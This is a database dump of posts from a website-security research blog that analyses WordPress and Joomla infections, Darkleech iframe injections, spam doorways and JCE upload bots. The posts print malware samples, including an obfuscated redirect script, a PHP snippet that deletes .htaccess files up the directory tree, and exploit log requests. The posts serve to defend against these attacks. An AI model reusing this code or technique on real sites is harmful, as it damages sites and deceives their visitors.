INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (1, '“Fancybox for WordPress Has Expired” Infection', 'unmask', '01 Apr 15', 'Loading site search ...          			                “Fancybox for WordPress Has Expired” Infection                          01 Apr 15   Filed in General, Short Attack Reviews, Website exploits                Today I began to notice quite a massive and very unusual attack that leverages vulnerabilities in older versions of the FancyBox for WordPress plugin.As you might know, versions 3.0.2 and older of this plugin allowed anyone to craft special POST requests to /wp-admin/admin-post.php or /wp-admin/admin-ajax.php and change values of specific plugin options in WordPress database. The plugin uses the modified options to build its own JavaScript code. As a result, the malicious content gets injected into generated WordPress pages.A typical malicious injection looks like this:Such attacks use the documented exploit code to inject malicious code into the “padding” value.The exploited vulnerability had been fixed on February 4th. Nonetheless, many blogs failed to update the plugin and hackers routinely find such blogs and infect them.The today’s attack also uses this exploit and modifies the “padding” value, but the code it injects cannot be called malicious:When visitors load such “infected” pages, they see this warning:WARNING: This version of the Fancybox for WordPress plugin has expired! Please upgrade to the latest version!And when they click on the “OK” button, they automatically get redirected to the Fancybox for WordPress changelog page in the official WordPress plugin repository.On one hand, this infection makes blogs unusable since it redirects visitors to WordPress plugin repository before they can read anything. On the other hand, it is very hard to ignore such a warning — if site owners want people to visit their sites they have to upgrade (or remove) the vulnerable version of the plugin ASAP.Now is the time to check if your blog shows such warnings. If you don’t see them, it’s not a reason to relax and wait for such a hard push to upgrade. Make sure all your themes and plugins are up-to-date now.                                                                                   Tags: April1 Fancybox WordPress                                                    			                                            « Darkleech Update – November 2014                            			    Reader\'s Comments (%)       	        			        			Pascal | 02 Apr 2015 8:43 am 						I’m a little suspicious because this article is tagged with “April1″ – though I don’t really see the sense in making this a hoax?', '', 'http://blog.unmaskparasites.com/2015/04/01/fancybox-for-wordpress-has-expired-infection/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (2, 'Darkleech Update – November 2014', 'unmask', '27 Nov 14', 'Loading site search ...          			                Darkleech Update – November 2014                          27 Nov 14   Filed in Short Attack Reviews, Website exploits                Just wanted to document some latest changes in Darkleech behavior that may help you detect it.I’d like to thank internet security enthusiasts who share their findings with me. Without you, I could have easily missed these new (?) details.Quick recapDarkleech is a root level server infection that installs malicious Apache modules. The modules inject invisible iframes into server response when it is already prepared (linebreaks added for readability).<style>.a4on6mz5h { position:absolute; left:-1376px; top:-1819px} </style> <div class=\"a4on6mz5h\"><ifr ame src=\"hxxp://tfmjst .hopto .org/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"247\" height=\"557\"></ifram e></div>All the elements of this code are random and auto-generated on the fly (style name, coordinates, iframe diminsions, URL paths). Moreover, the iframe domains change every few minutes — lately hackers prefer free No-IP.com dynamic DNS hostnames like hopto.org, ddns.net, myftp.biz, myftp.org, serveftp.com, servepics.com, etc.This infection is hard to detect as it only shows up once per IP per day (or maybe even more seldom). And since it works on a low system level, it can detect if server admins are logged in, so it lurks until they log out — this means that they won’t see anything even if they monitor outgoing TCP traffic.For more details, please check the links at the bottom of this post.What’s new?IE=EmulateIE9Recently, I’ve been pointed at the fact that now Darkleech also adds the following meta tag setting IE 9 compatibility mode in Internet Explorer. It looks like it searches for the </head> tag and replaces it with the following code (again, linebreaks added for readability):<meta http-equiv=\'x-ua-compatible\' content=\'IE=EmulateIE9\'></head><style>.syxq9la69 { position:absolute; left:-1666px; top:-1634px} </style> <div class=\"syxq9la69\"><iframe src=\"hxxp://jsnrgo .ddns .net/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"285\" height=\"554\"></iframe></div>This IE=EmulateIE9 instruction tells modern versions of Internet Explorer to render a web page as if they were IE 9, using all the features that has been deprecated in IE 10 and newer versions of IE. Some of the legacy features are known to have vulnerabilities and hackers try to exploit them turning the compatibility mode on (e.g. VML-related exploit)_SESSION_ID cookieIn addition to temporary IP blacklisting, Darkleech also uses the _SESSION_ID cookie that expires in one week. It adds the following cookie into response headers:Set-Cookie: _SESSION_ID=-1; expires=Wed 03-Dec-2014 09:32:48 GMT; path=/So even if you change your IP address (e.g. if you have a dynamic IP address) you still won’t see malware for the following 7 days. So don’t forget to clear/block cookies if you are trying to reproduce infected response.Most likely the IP blacklisting also works for one week now too.Just a couple of more things:As you might have figured out, it looks for Internet Explorer User-Agent (and derivatives like Maxthon, Avant).Referer is not important at the moment. I managed to trigger it even without the Referer header.That’s it for today. Please let me know if you have some other news about Darkleech.Previous posts about Darkleech:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsWorking With the Darkleech Bitly DataDarkleech + Bitly.com = Insightful Statistics (Sucuri blog)Server Compromises – Understanding Apache Module iFrame Injections and Secure Shell Backdoor (Sucuri blog)                                                                                   Tags: Apache Darkleech EmulateIE9 No-IP                                                    			                                            « Most Contradictive Doorway Generator                “Fancybox for WordPress Has Expired” Infection »            			    Reader\'s Comments (2)       	        			        			WordPress Malware Causes Psuedo-Darkleech Infection | Sucuri Blog | 26 Mar 2015 4:25 pm 						[…] and this is the code from November of 2014 […]                   			        			WordPress Malware Causas Psuedo-Darkleech Infección | Sucuri Español | 13 Apr 2015 10:41 pm 						[…] y este es el código de noviembre de 2014: […]', '', 'http://blog.unmaskparasites.com/2014/11/27/darkleech-update-november-2014/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (3, 'Most Contradictive Doorway Generator', 'unmask', '12 Sep 14', 'Loading site search ...          			                Most Contradictive Doorway Generator                          12 Sep 14   Filed in Short Attack Reviews                Check this thread on WordPress.org forum. The topic starter found a suspicious PHP file and asked what it was doing.The code analysis shows that it’s some sort of a spammy doorway. But it’s a very strange doorway and the way that it works doesn’t make sense to me.First of all, this script has a random text and code generator. The output it generates is [kind of] always unique. Here is a couple of output pages:http://pastebin.com/ymwMZMWPhttp://pastebin.com/Y6B7WM2T...<title>Is. Last spots brows: Dwelling. Immediately moral.</title></head><body>listend40721<span>Flowerill merry chimes - has: Her - again spirits they, wooers. Delight preserve. For he. Free - snow set - grave lapped, icecold made myself visitings allow, beeves twas. Now one:...We usually see such a random text, when spammers want search engines to index “unique” content with “right” keywords. But…1. the script returns the page with the 404 not found code.header(\"HTTP/1.1 404 Not Found\");so the page won’t be indexed by search engines.2. The obfuscated JavaScript code at the bottom of the generated page redirects to a pharma site after about a second.function falselye() { falselya=29; falselyb=[148,134,139,129,140,148,75,145,140,141,75,137,140,128,126,145,134,140,139,75,133,143,130,131,90,68,133,145,145,141,87,76,76,145,126,127,137,130,145,138,130,129,134,128,126,143,130,144,75,130,146,68,88];falselyc=\"\"; for(falselyd=0;falselyd<falselyb.length;falselyd++) { falselyc+=String.fromCharCode(falselyb[falselyd]-falselya); } return falselyc; } setTim eout(falselye(),1263);decodedwindow.top.location.href=\'hxxp://tabletmedicares .eu\';Update: on another site the script redirected to hxxp://uanlwkis .com (also pharma site), which was registered only a few days ago on Sept 6th, 2014.But the generated text has no pharma keywords. One more hint that it’s not for search engines. Maybe it’s an intermediary landing page of some email spam campaign that just needs to redirect visitors? I saw many such landing pages on hacked sites. But it most cases they looked like the decoded version of the script — just a redirection code. Indeed why bother with sophisticated random page generator if no one (neither humans nor robots) is going to read it?3. There is also this strange piece of code:$s=\'/\';if (strtolower(substr(PHP_OS,0,3))==\'win\') $s=\"\\\\\\\\\";$d=array(\".$s\");$p=\"\";for($i=1; $i<255; $i++){$p.=\"..$s\";if (is_dir($p)){array_push($d,$p);}else{break;}}foreach($d as $p){$a=\"h\".\"tac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod($a2,0666);@unlink($a2);@chmod($a3,0666);@unlink($a3);}What it does it tries to find an delete(!) all file with names .htaccess, htaccess and htaccess.txt in the current directory and all(!) the directories above the current.That just doesn’t make sense. Why is it trying to corrupt websites? I would understand if it only removed its own files and injected code in legitimate files, but it tries to just remove every .htaccess (and its typical backups) without checking what’s inside. That’s a really disruptive and annoying behavior given that many sites rely on the settings in .htaccess (e.g. most WordPress and Joomla sites).It’s indeed a most contradictive doorway generator that I ever seen. I can’t find any good explanation why it does things the way it does. Maybe you have any ideas?Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for SpammersHtaccess Redirect to Example.ru/dir/index.phpIntroduction to Website Parasites                                                                                  Tags: doorway htaccess redirect                                                    			                                            « Google -> Doorway -> Google -> Spam                Darkleech Update – November 2014 »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/09/12/most-contradictive-doorway-generator/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (4, 'Google -> Doorway -> Google -> Spam', 'unmask', '11 Jun 14', 'Loading site search ...          			                Google -> Doorway -> Google -> Spam                          11 Jun 14   Filed in Uncategorized                Just a few thoughts about an interesting behavior of a black-hat SEO doorway.Typically hackers create doorways on compromised sites to make search engines rank them for certain keywords and then, when searchers click on the links in search results, those doorways redirect them further to a site that hackers really promote. Sometime that redirect may go through some TDS (traffic directing service) but the whole scheme remains pretty much the same:Search results -> doorway -> beneficiary siteToday, when doing a backlink research of one of such pharma doorways, I encountered a different scheme — a one with a loop.The doorway had this URL structure:http://www.hacked-site.com/blog/?prednisolone-without-prescriptionWhen I checked it in Unmask Parasites or in Google cache, I saw spammy content with links to doorways on other hacked sites. Quite typical.When I opened that page in a web browser, it redirected to a TDShxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&gdw=w-48&gdf=%2F90dc16aaf3e24ea68c94c3f784a37ff9-f08f149982bf04ffaa308aba00b2d569.txt&host=www.hacked-site.com&kw=prednisolone%20without%20prescription&HTTP_REFERER=https%3A%2F%2Fwww.google.com%2F%3Fsource%3Dnoref%26q%3Dprednisolone%2520without%2520prescriptionCloaking and conditional redirects to traffic directing services are also quite typical for doorways.Then TDS made another hop:hxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&seoref=8bB06MP5xFTR3TkqmNILbbW5mW30f%2B%2FMiQdbatwxiv5CUUTkQjEO75VtTs7IRqdVTmPfmX……..2FIXHlBdqV6iDd1ruYQMhqmYVCozdkTrAN76fOABiczAnd then I ended up on … Google:http://www.google.com/search?q=prednisolone+without+prescriptionAnd that is not very typical. But interesting.One one hand, it looks like the spammers didn’t consider me as a target traffic (probably because of my IP) and redirected back to the Google search results page for the same query that I supposed to be using when found that site. For some, this chain of redirects may look as if they clicked on a search result and then Google thought for some time and reloaded the same page, which may look like just a glitch.On the other hand, it looks like a second level of search engine optimization, when spammers fine tune a search query that may return better doorways. I can’t help thinking about this because when I see the search results on Google pages that the TDS redirects me to, I realize that most of them are doorways on hacked sites (yes, including those with fake stars in ratings).I know, it’s quite pointless. Why redirect people who already clicked on your doorway to a new set of search results? Although those results may contain some of your other doorways, there is no guarantee that the searcher will not go away or click on them and not on links of your competitors? And you can’t control Google search results — it may happen that there will be no your doorways on the results page.OK. Let’s try to think as the TDS owners. The TDS recognizes the traffic that it doesn’t need for the pharma campaign. It mayredirect it to pharma landing pages anyway (which may decrease the quality and the price of such a traffic)dispose of that traffic altogether (redirect it to a neutral third-party site, like Google)try to monetize that traffic anyway — redirect it to some scam site, porn site, malware site or any other resource that knows how to take advantage of low quality traffic.<warning:unfounded speculation>But what it the spammers also run another campaign that targets the traffic that doesn’t fit their pharma campaign? They can simply redirect the traffic to landing pages of the second campaign. But such traffic will not be targeted. People searched for different things. So maybe it is worth it to “re-target” the traffic and redirect the searchers to a Google result page for keywords relevant to that second campaign and that contains links to their doorways.Here’s the scenario:People search something on Google and click on some result. For some reason Google reloads the page and shows them completely different results for a different query. Some searchers will definitely leave (don’t worry, this was unwanted traffic anyway) but some may become interested in what Google offers them and click on results (after all spammers usually promote something that people need and if it comes from Google it looks more legit). So, instead of either lost or untargeted traffic, they get targeted traffic of people who willingly clicked on search results. All they need to do is make sure their doorways dominate for relevant search queries (shouldn’t be hard since the TDS provide the search query itself and there is no need to rank for short generic queries.)</warning:unfounded speculation>OK, enough speculations. That particular campaign was not using the second level Google optimization. It simply dumped unneeded traffic back to Google. When opening the same doorways from different country IPs, the TDS redirected me to a random “Canadian Pharmacy” site from its pool of about a dozen of sites.Anyway, the point of this post is despite of Matt Cutts’ recent announcement of rolling out the second ranking update for “very spammy queries” I still see that 50% or more of top search results for pharma keywords still point to doorways on hacked sites.This past weekend we started rolling out a ranking update for very spammy queries: http://t.co/NpUZRqpnBI— Matt Cutts (@mattcutts) May 21, 2014And as long as “very spammy queries” return “very spammy results”, there will be incentive for black hat SEOs to hack sites and create doorways there.Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesIntroduction to Website Parasites                                                                                  Tags: black hat seo doorway TDS                                                    			                                            « Working With the Darkleech Bitly Data                Most Contradictive Doorway Generator »            			    Reader\'s Comments (2)       	        			        			SearchCap: Google PayDay Loan 3.0, Bing Ads URL Tagging & World Cup Fever | 12 Jun 2014 9:14 pm 						[…] Google -> Doorway -> Google -> Spam, Unmask Parasites. Blog. […]                   			        			Rosanne & Jerry Shalf | 03 Dec 2014 6:27 pm 						I keep getting redirected to a Canadian drugstore site when I type in ashlandmuseum.org. Before the Canadian drugstore site pops up I see something that looks like tds….etc. but it quickly moves to the Canadian site, so I don’t know the complete set of letters.  I have a macbook pro 2012 and am using Maverick 10.9.5 OS.  It doesn’t always happen, which is weird, and it only happens on my computer, not others.  It happens when I use Firefox and Safari.  How do I get rid of it?  I had Applecare go through the machine and we got rid of various viruses, but we couldn’t fix this one.  Applecare said it was because of something Google did and only Google can fix, but I can’t figure out how to reach Google and ask for help.  Please, somebody, help me!!', '', 'http://blog.unmaskparasites.com/2014/06/11/google-doorway-google-spam/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (5, 'Working With the Darkleech Bitly Data', 'unmask', '10 Feb 14', 'Loading site search ...          			                Working With the Darkleech Bitly Data                          10 Feb 14   Filed in General                Data Driven Security took the time to analyze the raw data that I published in my recent post on Sucuri blog about how I used Bitly data to understand the scale of the Darkleech infection.In their article, they have a few questions about data formats, meaning of certain fields and some inconsistencies, so I’ll try to answer their questions here and explain how I worked with the data.So I needed to get information about all the links of the “grantdad” bitly account.I checked the API and somehow missed the “link_history” API request (it was the first time I worked with the bitly API), so I decided to screenscrape the web pages where bitly listed the links creaded by grantdad. 1,000 pages with 10 links on each. Since pages didn’t contain all the information I needed I only collected the short links so that I could use them later in API calls to get more detailed information about each of them.As you can see I was limited with the 10,000 links that bitly made available via their web interface. Not sure if I could get more links via that link_history API. Right now it returns “ACCOUNT_SUSPENDED” and when it was not suspended, API calls for known links beyond those 10,000 produced various errors.When I compiled my list of 10,000 links I used the following API calls to get information about each of the links:Referring domainsAPI:link/referring_domains — for each link, it returned a list of domains referring traffic to this link (in our case sites, containing the iframes) along with the number of clicks from each domain. This helped me compile this list of iframe loads per domain: http://pastebin.com/HYaY2yMb. Then I tried to resolve each of the domain names and created this list of infected domains per IP address: http://pastebin.com/Gxr51Nc1.I also used this API call to get number of iframe loads for each bitly link.InfoAPI:link/info – this gave me timestamps of the links and their long URLs (the rest information was not interesting for my research). Unfortunately, this particular API call is poorly documented so I can only guess what this timestamp mean. It is actually called “indexed“. But I guess it’s the time when the link was created. It is definiteley not the time of the first click because there were no registered clicks for many of the links. As a result, I compiled these datasets:http://pastebin.com/UmkDZZp0http://pastebin.com/w7Kq3ybV ,which contain tab separated values of “bitly link id”, “timestamp”, “# of clicks/iframe loads”, and “long URL”.At that point, I already had the number of iframe loads from the previous step (“link/referring_domains“). Then, for readability, I converted the numeric timestamp using this Python function datetime.datetime.fromtimestamp(). However, you can notice that the second dataset (for January 28th) has a different date format. Instead of “2014-01-25 19:10:07” it uses “Jan 28 23:10:19“. Why? Because of pastebin.com. Because it doesn’t allow unregistered users to post more than 500Kb of data (I deliberately post such data as a guest). Removing the year from the date allowed me to save 4 bytes on each row and fit the dataset in 500Kb.Actually this 500Kb limit is the reason why I have separate pastebins for each date and only specify bitly ids instead of the full bitly links.CountriesAnd finally, API:link/countries – for each link, it returned a list of countries referring traffic to this link along with the number of clicks from those countries. This helped me compile this list of iframe loads per country http://pastebin.com/SZJMw3vx.The last dataset Feb 4-5When I wrote my blogpost on February 5th, I noticed that there were new links available on the Bitly.com grantdad acount page. I began to browse pages of his links and figured that most of the links were the same (Jan 25 and 28) but around 1,700 of them were new (late February 4th and the beginning of February 5th). I immediately repeated the same procedure that included screenscraping, and 3 API calls for each new bitly link. After that I created this new dataset http://pastebin.com/YecHzQ1W and updated the rest datasets (domains, countries, etc).Some more detailsIf you check the total numbers in these two datasets (domains) http://pastebin.com/HYaY2yMb and (countries) http://pastebin.com/SZJMw3vx you’ll see the different in total number of iframe loads: 87152 and 87269. I don’t know why. I used the same links just different API calls (referring_domains and countries) and the totals are supposed to be the same. I didn’t save the “per link” data so can’t tell exactly whether it was my error or the bitly API produces slightly inconsistent results. Anyway, the difference is neglectable for my calculations and doesn’t affect the estimations (given that I tried to underestimate when in doubt ).I didn’t check for duplicates that guys from Data Driven security found in my datasets. They must have to do with my screenscraper and the way that Bitly.com displays links in user accounts. The total number of scraped links matched the number of links that Bitly reported for the user. The extra 121 clicks that these duplicates are responsible for are so close to the 117 difference that I mentioned above so I wonder if these numbers somehow connected? Anyway, this shouldn’t affect the accuracy of the estimates either.Building the geo distribution mapFor the map, I used the Geochart from Google visualization. Since the difference in numbers of clicks for the top 3 countries and the lower half of the list was 3 orders of magnitude, I had to re-scale the data so that we could still see the difference between countries with 50 iframe loads and 2 iframe loads.. I used a square of a natural logarithm for thatMath.pow( Math.round( Math.log(i)), 2)This gave me a nice distribution from 0 to 100 and the below map.IFrame Load Geo DistributionSpeculation on the link generationAfter checking the link creation per minute-of-an-hour distribution, Bob Rudis wondered:This is either the world’s most inconsistent (or crafty) cron-job or grantdad like to press ↑ + ENTER alot.I guess, it was neither cron-job nor manual link creation. I think the [bitly] links were created on-demand. So if someone loads a page and Darkleech needs to inject an iframe then it (or rather the server it works with) generates a new bitly link. Given that this malware may lurk on a server, there may be time periods when no malicious code is being injection into any web pages across all the infected servers. At the same time, the bitly links with zero clicks may refer to page loads by various bots (including our own) when the malicious code is injected but the iframe is never loaded. On the other hand, the volume of bitly links with 0 clicks (~35%) suggests that there might really more complex link generation mechanism than a simple “on-demand” approach.Anyway, that’s great when people double check our data and try to find new interesting patterns there. Make sure to let me know (here or on the Sucuri blog) if you find more patterns and inconsistencies, or have any comments on how the Darkleech works.Related posts:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsBety.php Hack. Part 2. Black Hats in Action.Introduction to Website Parasites                                                                                  Tags: Bitly Darkleech data statistics                                                    			                                            « Invasion of JCE Bots                Google -> Doorway -> Google -> Spam »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/02/10/working-with-the-darkleech-bitly-data/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (6, 'Invasion of JCE Bots', 'unmask', '27 Jan 14', 'Loading site search ...          			                Invasion of JCE Bots                          27 Jan 14   Filed in Website exploits                Joomla has been one of the most popular CMS for a long time.  It powers a huge number of sites.  That’s great! The flip side of this fact is Joomla has been very popular for a long time and there are still very many sites that use older versions of Joomla as well as older version of Joomla components. For example, the 1.5.x branch of Joomla (2008-2010) still has a noticeable share in live Joomla sites.Old versions may work well for your site but they have multiple well known security holes, so they are the low hanging fruit for hackers. Let me show this using a real world example.JCE attackThere is a JCE component — a fancy content editor that can be found almost on every Joomla site. It has a well known security hole that allows anyone to upload arbitrary files to a server.You can easily find a working exploit code for this vulnerability.  What it does is:Checks whether a vulnerable version of JCE is installed (2.0.11, 2.0.12, 2.0.13, 2.0.14, 2.0.15, 1.5.7.10, 1.5.7.11, 1.5.7.12, 1.5.7.13, 1.5.7.14)Exploits the bug in the JCE image manager to upload a PHP file with a .gif extenstion to the images/stories directoryThen uses a JSON command to rename the .gif file to *.php.Now you have a backdoor on a server and can do whatever you want with the site.This is how this attack looks in logs (real example):197.205.70.37 - - [23/Jan/2014:16:46:54 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.0\" 200 302 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20 HTTP/1.0\" 200 329 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"GET /images/stories/3xp.php HTTP/1.0\" 200 465 \"-\" \"BOT/0.1 (BOT for JCE)\"As I mentioned, JCE is a very popular component and there are still many sites that use old versions of this component. No wonder, hackers are scanning the Internet for such vulnerable sites.  They reworked the exploit code for use in their automated tools that relentlessly test millions of sites, one by another.  These days, I can find multiple requests with the “BOT/0.1 (BOT for JCE)” User-Agent string in logs of almost every site that I check, even in logs of sites that have never had Joomla installed.I’d like to share some interesting statistics of a real site that had been hacked using this JCE hole and then was being routinely reinfected every day.7,409 requests with the User-Agent “BOT/0.1 (BOT for JCE)” that came from 785 different IPs during the period of Dec 24th – Jan 24th (one month)239 requests from 51 unique IP addresses during the last 24 hours4 independent (uploaded different types of backdoors) successful infections during one day.plus, multiple tests for other vulnerabilities.To webmastersAs you can see,  this is something that you can’t neglect or consider an insignificant threat.  It’s silly to hope that hackers won’t find your site. Today hackers have resources to spider the Internet almost as efficiently as Google just about 10 years ago, so there is almost no chance your site will stay unnoticed. The only way to prevent the hacks is to be proactive:  keep all software up-to-date and harden your sites.In case of this particular JCE attack:Make sure to upgrade your Joomla site to the most current version.Upgrade JCE to the latest version. You can find download packages for all the three branches of Joomla here.Protect all file upload directories and all directories that shouldn’t contain .php files. For example, place the following .htaccess file there to prevent execution of PHP files:<Files *.php>deny from all</Files>Try blocking requests with the “BOT/0.1 (BOT for JCE)” User-Agent string.  Of course, this shouldn’t be considered as a real protection. Hackers can change the User-Agent string to whatever they want. But it can help keep some dumb annoying bots away from your site.If, for some reason, you can’t upgrade your site at this moment, consider placing it behind a website firewall that will block any malicious traffic before it reaches your server.  This is something that we call virtual patching in Sucuri CloudProxy.                                                                                  Tags: exploit JCE Joomla                                                    			                                            « Reporting Suspicious Styles                Working With the Darkleech Bitly Data »            			    Reader\'s Comments (8)       	        			        			Jim Walker | 28 Jan 2014 5:47 pm 						Nicely done!The JCI component “problem” and has been a thorn in the Joomla communities side for years.I would go so far as to say that 1/2 of all of the hacked Joomla installations I’m asked to repair are JCE exploit related.As mentioned, simply adding the .htaccess “no execute php” file within the images/stories directory generally does the trick, though upgrading is always best.Personally, for this particular exploit, I prefer the below in my .htaccess file:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shI like how you linked out to Google and known JCE exploits as well.A quality post top to bottom. Kudos!                   			        			Denis | 28 Jan 2014 7:12 pm 						Thanks Jim,That “text/plain” handler also does the trick and covers a broader range of attacks.I don’t want to link directly to exploits. But if you want to find the information, this Google search is enough. At the same time, if there is some new JCE file upload vulnerability, this search will show it too, so the link will remain fresh and useful.                   			        			machineX | 19 Sep 2014 9:05 am 						I just seen it in some logs for the second time. We do not use joomla. But I think your .htaccess code is very useful in preventative measures for sites overall.                   			        			Brian M | 20 Feb 2014 3:10 pm 						I’m curious if you would have any more information on exactly what is allowing the exploit to work? I understand it’s an exploit in code which was in an old version of Joomla, but my vBulletin sites are apparently being exploited by this Bot for JCE script. I do not have any pieces of Joomla installed on the server – at least, not that I’m aware of. Thankfully Microsoft Security Essentials is catching the backdoor/shell script being uploaded to the site and is removing it before they can use it, but it scares me that they’re able to upload the file to my site in the first place. I’ve tried to get help from vBulletin but they brush it off as not being on their end.                   			        			Denis | 11 Jun 2014 5:13 pm 						In case of Joomla JCE, it just uses a bug to upload a PHP file as a .gof and then change it’s extension to .php.If you don’t have Joomla, then you might see multiple attempts to scan your site for that JCE security hole. They do it on every site. If they find it – they exploit it, if not they move on to the next site. So what you are seeing is probably just attack attempts, not successful attacks. On the other hand, if hackers find vulnerabilities in vBulletin or any other type of site, they’ll most likely upload pretty much the same backdoors as if it was Joomla.vBulletin may be slightly different as most of it’s malware lives in its database.                   			        			JCE Joomla Extension Attacks in the Wild | Sucuri Blog | 26 Mar 2014 8:11 pm 						[…] Unmask: Invasion of JCE Bots […]                   			        			catalina | 30 Mar 2014 6:23 am 						If I understood, I have to open my .htaccess file and insert these lines:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shThats it?Which are the “collateral effects” of this?Thanks in advanceCatalina                   			        			Denis | 11 Jun 2014 5:16 pm 						This code makes web server treat such files as regular text files. I.e. instead of executing any code in them, it will just display their content in a browser as if they were plain text files.The side effect is you won’t be able to have executable scripts in those directories. But it’s the point of this trick – place it to the directories that shouldn’t have executable files', '', 'http://blog.unmaskparasites.com/2014/01/27/invasion-of-jce-bots/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (7, 'Reporting Suspicious Styles', 'unmask', '22 Nov 13', 'Loading site search ...          			                Reporting Suspicious Styles                          22 Nov 13   Filed in Unmask Parasites                Back in 2008, the very first task that I created Unmask Parasites for was scanning web pages for hidden links.I read an article about thousands of WordPress blogs being stuffed with dozens of invisible spammy links. I had a self-hosted WordPress blog too and that article made me think if there was some easy way to figure out whether my blog was hacked, something less laborious than manually examining the HTML code link by link. So I decided to create a tool that would show all domains that my web pages linked to highlighting those of them that had “invisible” styles. This approach has proved to be very efficient in identifying black hat SEO hacks. In most cases, a glance is enough to spot such problems.It works well even when the tool doesn’t highlight links as “hidden” (either because the “hiding rule” was not detected or because it scanned the “cloaked” page created specifically for search engines). You can still see the links that clearly don’t belong to your site, which tells you that something’s wrong.However, looking for suspicious links is not the bullet-proof method for detecting spam injection issues. For example, in my yesterday’s post on Sucuri blog, I wrote about fake WordPress plugins that used to injects spammy links and a JavaScript code into web pages. However, at the moment, they inject some hidden spammy auto-generated text that doesn’t have any links.You can use this Google query to reveal affected sites [cigarettes AND (“3200 unhealthy” OR “3300 hazardous”)]I don’t know why they do it, but webmasters should definitely be warned about such injections because it’s a sign of a problem that should be fixed as soon as possible. This is actually more serious than just a factor that can potentially affect site’s search ranking. Those fake plugins fetch the spammy content from remote servers and inject it into blog pages on the fly. This means that hackers can change it any time and the same moment the new spammy block will be injected into all compromised sites. Or it can be a malicious block, which makes things more serious as it will affect all visitors to those sites too.Unfortunately, such injections were not reported by Unmask Parasites since there were no links in the spammy block. After thinking about the problem, I decided that Unmask Parasites should also report pure HTML tricks such as that clip:rect style trick that hackers use to hide their injections.So , starting this week, you may see the “Suspicious Styles” section in Unmask Parasites reports.In this section, you will see excerpts of the style definitions that Unmask Parasites considers suspicious. If you see it in your site reports, then you should check the HTML code of your pages and figure out whether that style is a normal part of your pages or it was added there to hide something illicit.Note, if you can’t find such code in your web pages, it doesn’t mean it is not there. The code injection can be conditional, and server files may fetch it from a remote location (as in this case with fake WordPress plugins), or it can be encrypted. Just remember that Unmask Parasites works in real time (some results may be cached for up to an hour) and if it reports something, then you can be sure it was on a web page at the moment of scanning.To Unmask Parasites usersIf you like Unmask Parasites and want to help improve it, you can inform me about interesting tricks that hackers use to hide injected content Or send me examples of infected web pages where Unmask Parasites doesn’t report any problems.Thanks!Related posts:Unmasking “Canonical” HacksRich Snippets in Black Hat SEOIntroduction to Website Parasites                                                                                  Tags: black hat seo hidden links spam                                                    			                                            « Unmask Parasites joins Sucuri                Invasion of JCE Bots »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/11/22/reporting-suspicious-styles-2/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (8, 'Unmask Parasites joins Sucuri', 'unmask', '20 Sep 13', 'Loading site search ...          			                Unmask Parasites joins Sucuri                          20 Sep 13   Filed in Unmask Parasites                It’s official. This week Unmask Parasites joins Sucuri!Since July of 2008 when I released the first public version, Unmask Parasites was a “one man project” and it worked fine for me most of the time. I did everything myself from server setup to site development, from web attack investigations to blogging here. During these years Unmask Parasites became quite noticeable both within webmasters and Internet security community. And I always tried to meet their expectations providing a tool that could reveal various obscure website security issues and sharing information on how and why websites get hacked, and what can be done to prevent it.When Sucuri approached me and asked if I wanted to join their team as a malware researcher, I didn’t think much. I’ve been watching this company since 2010 and knew how much we had in common in our approach to Internet security. We both focus on helping site owners to detect security problems and protect their sites. We do our best to educate webmasters about things that hackers do with compromised websites — unmasking their dirty tricks is an important part of our work. In 2011 we established good relationship and began to help each other by sharing our information about ongoing massive attacks. Now Sucuri has grown to one of the leading companies in its field and makes a significant impact on how many thousands of site owners protect their sites. It’s an honor for me to join this company and the team of professionals that I know for so long time.I guess you wonder what will happen to Unmask Parasites scanner and this blog? They are here to stay! I will still be responsible for Unmask Parasites and continue to improve it and publish my blogposts here. Even better: now that I’m with Sucuri, I will have access to large volumes of data from their tools and support team (something that I really missed during the last five years), which will definitely facilitate my investigations, and, in turn, improve the quality of Unmask Parasites scanner and Sucuri own tools.For additional information check 